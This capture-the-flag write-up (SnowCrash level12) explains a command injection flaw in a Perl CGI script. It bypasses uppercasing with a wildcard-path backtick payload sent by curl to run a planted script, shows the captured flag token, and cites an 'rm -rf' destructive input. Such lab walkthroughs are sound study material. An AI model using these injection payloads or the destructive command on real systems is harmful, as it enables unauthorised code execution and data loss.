# Exploit a substitution command in Perl

#!/usr/bin/env perl
# This script starts a CGI (Common Gateway Interface) program to handle web requests on localhost:4646

use CGI qw{param}; # Import the 'param' function from the CGI module to handle query parameters
print "Content-type: text/html\n\n"; # Send the HTTP header to indicate the content type of the response

# Define a subroutine 't' that checks if a specific pattern exists in a file
sub t {
  # $_[0] and $_[1] are the first and second arguments passed to the subroutine
  $nn = $_[1]; # The second argument, expected to be a string pattern to search for
  $xx = $_[0]; # The first argument, expected to be a string to transform and use in the search
  
  # Transform all lowercase letters in $xx to uppercase
  $xx =~ tr/a-z/A-Z/;
  
  # Remove all characters starting from the first whitespace character in $xx
  $xx =~ s/\s.*//;
  
  # Execute the egrep command to search for lines in /tmp/xd that start with $xx, capturing stderr
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  
  # Iterate through each line of the output
  foreach $line (@output) {
      # Split the line by the first colon ':' into $f and $s variables
      ($f, $s) = split(/:/, $line);
      
      # Check if $s (the part after the first colon) contains the pattern $nn
      if($s =~ $nn) {
          # If the pattern is found, return 1 (true)
          return 1;
      }
  }
  
  # If the pattern wasn't found in any line, return 0 (false)
  return 0;
}

# Define a subroutine 'n' that prints a response based on the argument
sub n {
  # Check if the argument passed to 'n' is 1 (true)
  if($_[0] == 1) {
      # If true, print two dots
      print("..");
  } else {
      # Otherwise, print one dot
      print(".");
  }    
}

# Execute the 'n' subroutine with the result of the 't' subroutine, which is called with 'x' and 'y' query parameters
n(t(param("x"), param("y")));



The security vulnerability in this Perl script lies in its use of unvalidated user input within a system command, specifically within the egrep command execution. This vulnerability is a classic example of command injection.


This line
@output = `egrep "^$xx" /tmp/xd 2>&1`;

User Input Not Sanitized: The variable $xx is modified to uppercase and truncated at the first space, but these transformations do not sanitize it against malicious payloads that include shell metacharacters. An attacker could craft input that closes the egrep command and starts a new command, which the server would then execute.

Exploitation Example: If an attacker submits the parameter x with a value like ; ls #, even after uppercase conversion and removing everything after the space, it would result in executing egrep "; LS #" /tmp/xd, which can be manipulated further to execute unintended commands. For example, an attacker could craft input like ; rm -rf /important_directory # to attempt destructive actions.

Lets exploit this

we can't exploit by simply call `getflag > /tmp/hack`,

because we have

 # Transform all lowercase letters in $xx to uppercase
  $xx =~ tr/a-z/A-Z/;
  
  # Remove all characters starting from the first whitespace character in $xx
  $xx =~ s/\s.*//;

so we create an UPPER CASE file to use shell substitution*

touch /tmp/HACK

chmod +x /tmp/HACK

level12@SnowCrash:~$ cat /tmp/HACK
#!/bin/sh
getflag | wall


..level12@SnowCrash:~$ curl localhost:4646?x='`/*/HACK`'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 23:56 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
                                                           
